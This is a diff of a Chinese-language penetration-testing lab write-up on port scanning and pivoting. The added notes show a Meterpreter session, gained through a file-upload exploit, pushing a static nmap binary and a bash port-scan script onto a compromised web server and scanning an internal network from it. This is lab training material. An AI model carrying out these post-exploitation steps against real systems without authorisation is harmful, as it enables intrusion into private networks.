@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Port Scanning With Auxiliary Modules"
-date: "2022-12-01"
+date: "2022-12-02"
 author: "r3kind1e"
 header-img: "img/post-bg-Penetration Testing Student.png"
 catalog:    true
@@ -237,6 +237,21 @@ The solution for this lab can be found in the following manual:  https://assets.
 
 ## 我自己的思路
 [PIVOTING](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
+
+第一次启动实验室：
+
+```
+Kali:
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.67.240.2  netmask 255.255.255.0  broadcast 192.67.240.255
+
+target-1:
+eth0: 192.67.240.3
+eth1: 192.88.231.2
+
+target-2:
+192.67.240.4
+```
 
 ```
 root@attackdefense:~# ifconfig
@@ -504,27 +519,187 @@ msf5 auxiliary(scanner/portscan/tcp) > run
 [*] Auxiliary module execution completed
 ```
 
-备注：
-
-Your mission:
-
-|Task|Todo|
-|---|---|
-|Identify the ports open on the second target machine using appropriate Metasploit modules.|√|
-|Write a bash script to scan the ports of the second target machine.|×|
-|Upload the nmap static binary to the target machine and identify the services running on the second target machine.|×|
+第二次启动实验室：
 
 ```
-Kali:
+root@attackdefense:~# ifconfig
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.67.240.2  netmask 255.255.255.0  broadcast 192.67.240.255
+        inet 192.209.179.2  netmask 255.255.255.0  broadcast 192.209.179.255
+        ether 02:42:c0:d1:b3:02  txqueuelen 0  (Ethernet)
 
-target-1:
-eth0: 192.67.240.3
-eth1: 192.88.231.2
+victim-1:
+www-data@victim-1:/tmp$ ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:c0:d1:b3:03  
+          inet addr:192.209.179.3  Bcast:192.209.179.255  Mask:255.255.255.0
 
-target-2:
-192.67.240.4
+eth1      Link encap:Ethernet  HWaddr 02:42:c0:eb:a3:02  
+          inet addr:192.235.163.2  Bcast:192.235.163.255  Mask:255.255.255.0
+
+victim-2: 
+192.235.163.3
 ```
+
+```
+msf5 exploit(unix/webapp/xoda_file_upload) > ls -al /root/tools/
+[*] exec: ls -al /root/tools/
+
+total 64
+drwxr-xr-x 1 root root 4096 Apr 23  2020 .
+drwx------ 1 root root 4096 Apr 23  2020 ..
+drwxr-xr-x 2 root root 4096 Feb  7  2019 Delorean
+drwxr-xr-x 5 root root 4096 Apr 28  2019 exfil
+drwxr-xr-x 2 root root 4096 Feb  7  2019 firepwd
+drwxr-xr-x 5 root root 4096 May 16  2019 GitTools
+drwxr-xr-x 2 root root 4096 Feb  7  2019 ircsnapshot
+drwxr-xr-x 3 root root 4096 Feb  7  2019 JohnTheRipper
+drwxr-xr-x 2 root root 4096 Feb  7  2019 known_hosts-hashcat
+drwxr-xr-x 2 root root 4096 May 14  2019 portable
+drwxr-xr-x 2 root root 4096 Feb  7  2019 reGeorg
+drwxr-xr-x 3 root root 4096 Feb  7  2019 scripts
+drwxr-xr-x 1 root root 4096 Nov 21  2019 srtp-decrypt
+drwxr-xr-x 2 root root 4096 Apr 23  2020 static-binaries
+drwxr-xr-x 2 root root 4096 Feb  7  2019 steganography
+msf5 exploit(unix/webapp/xoda_file_upload) > ls -al /root/tools/static-binaries
+[*] exec: ls -al /root/tools/static-binaries
+
+total 10272
+drwxr-xr-x 2 root root    4096 Apr 23  2020 .
+drwxr-xr-x 1 root root    4096 Apr 23  2020 ..
+-rwxr-xr-x 1 root root 2532960 Apr 23  2020 ncat
+-rwxr-xr-x 1 root root 6100104 Apr 23  2020 nmap
+-rwxr-xr-x 1 root root 1869808 Apr 23  2020 nping
+```
+
+我们需要上传的nmap静态二进制文件在：`/root/tools/static-binaries/nmap`。
+
+端口扫描脚本portscan.sh：[bash-scripts/utils/portscan.sh](https://github.com/mnorin/bash-scripts/blob/master/utils/portscan.sh)
+
+```bash
+#!/bin/bash
+
+if [ "$1" == "" ]
+then
+    echo
+    echo This script scans TCP opened ports on IP or hostname
+    echo Usage : portscan.sh \<ip-or-hostname\> \[start-port\] \[end-port\]
+    echo start-port equals to 1 by default
+    echo end-port equals 1024 by default
+    echo
+    exit
+fi
+
+START_PORT=${2:-1}
+END_PORT=${3:-1024}
+echo "Scanning $1 (ports $START_PORT to $END_PORT)"
+
+PORT_PROTOCOL="tcp"
+
+scan_port(){
+    PORT_NUMBER=$1
+    PORT_SCAN_RESULT=`2>&1 echo "" > /dev/$PORT_PROTOCOL/$TARGET_NAME_OR_IP/$PORT_NUMBER | grep connect`
+    [ "$PORT_SCAN_RESULT" == "" ] && echo $PORT_NUMBER\/$PORT_PROTOCOL'	'open'	'`grep $PORT_NUMBER/$PROTOCOL /etc/services | head -n1 | awk '{print $1}'`
+}
+
+TARGET_NAME_OR_IP=$1
+echo 'PORT	STATE	SERVICE'
+
+for PORT_NUMBER in `seq $START_PORT $END_PORT`
+do
+    scan_port $PORT_NUMBER
+done
+```
+
+```
+meterpreter > getuid
+Server username: www-data (33)
+```
+
+```
+meterpreter > upload /root/tools/static-binaries/nmap /tmp/nmap
+[*] uploading  : /root/tools/static-binaries/nmap -> /tmp/nmap
+[*] Uploaded -1.00 B of 5.82 MiB (0.0%): /root/tools/static-binaries/nmap -> /tmp/nmap
+[*] uploaded   : /root/tools/static-binaries/nmap -> /tmp/nmap
+meterpreter > upload /root/portscan.sh /tmp/portscan.sh
+[*] uploading  : /root/portscan.sh -> /tmp/portscan.sh
+[*] Uploaded -1.00 B of 826.00 B (-0.12%): /root/portscan.sh -> /tmp/portscan.sh
+[*] uploaded   : /root/portscan.sh -> /tmp/portscan.sh
+meterpreter > cd /tmp
+meterpreter > shell
+Process 793 created.
+Channel 2 created.
+/bin/bash -i
+bash: cannot set terminal process group (425): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@victim-1:/tmp$ ls -al
+ls -al
+total 5972
+drwxrwxrwt 1 root     root        4096 Dec  2 04:37 .
+drwxr-xr-x 1 root     root        4096 Dec  2 04:22 ..
+-rw-r--r-- 1 www-data www-data 6100104 Dec  2 04:36 nmap
+-rw-r--r-- 1 www-data www-data     826 Dec  2 04:37 portscan.sh
+www-data@victim-1:/tmp$ chmod +x nmap
+chmod +x nmap
+www-data@victim-1:/tmp$ chmod +x portscan.sh
+chmod +x portscan.sh
+www-data@victim-1:/tmp$ ls -al
+ls -al
+total 5972
+drwxrwxrwt 1 root     root        4096 Dec  2 04:37 .
+drwxr-xr-x 1 root     root        4096 Dec  2 04:22 ..
+-rwxr-xr-x 1 www-data www-data 6100104 Dec  2 04:36 nmap
+-rwxr-xr-x 1 www-data www-data     826 Dec  2 04:37 portscan.sh
+```
+
+```
+www-data@victim-1:/tmp$ ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:c0:d1:b3:03  
+          inet addr:192.209.179.3  Bcast:192.209.179.255  Mask:255.255.255.0
+
+eth1      Link encap:Ethernet  HWaddr 02:42:c0:eb:a3:02  
+          inet addr:192.235.163.2  Bcast:192.235.163.255  Mask:255.255.255.0
+```
+
+```
+www-data@victim-1:/tmp$ ./portscan.sh 192.235.163.3
+./portscan.sh 192.235.163.3
+Scanning 192.235.163.3 (ports 1 to 1024)
+PORT    STATE   SERVICE
+21/tcp  open    ftp
+22/tcp  open    ssh
+80/tcp  open    http
+```
+
+```
+www-data@victim-1:/tmp$ ./nmap -sn 192.235.163.0/24
+./nmap -sn 192.235.163.0/24
+Starting Nmap 7.70 ( https://nmap.org ) at 2022-12-02 04:45 UTC
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for victim-1 (192.235.163.2)
+Host is up (0.00028s latency).
+Nmap scan report for 192.235.163.3
+Host is up (0.00022s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 15.61 seconds
+```
+
+```
+www-data@victim-1:/tmp$ ./nmap 192.235.163.3
+./nmap 192.235.163.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2022-12-02 04:50 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 192.235.163.3
+Host is up (0.00013s latency).
+Not shown: 1201 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
+```
+
+
 
 
